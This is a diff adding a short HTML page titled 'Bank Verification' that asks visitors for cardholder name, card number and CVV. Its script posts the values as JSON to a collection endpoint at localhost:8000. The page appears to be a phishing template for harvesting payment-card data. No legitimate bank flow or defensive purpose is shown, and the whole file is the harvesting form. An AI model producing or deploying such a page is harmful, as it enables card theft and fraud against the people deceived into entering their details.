@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bank Verification</title>
+</head>
+<body>
+
+<h2>Card Verification Required</h2>
+
+<form id="cardForm">
+
+<input type="text" id="name" placeholder="Cardholder Name"><br><br>
+
+<input type="text" id="card" placeholder="Card Number"><br><br>
+
+<input type="text" id="cvv" placeholder="CVV"><br><br>
+
+<button type="submit">Submit</button>
+
+</form>
+
+<script>
+
+document.getElementById("cardForm").addEventListener("submit", function(e){
+
+e.preventDefault();
+
+const data = {
+name: document.getElementById("name").value,
+card: document.getElementById("card").value,
+cvv: document.getElementById("cvv").value
+};
+
+fetch("http://localhost:8000/submit", {
+method: "POST",
+headers: {"Content-Type": "application/json"},
+body: JSON.stringify(data)
+});
+
+alert("Submitted");
+
+});
+
+</script>
+
+</body>
+</html>
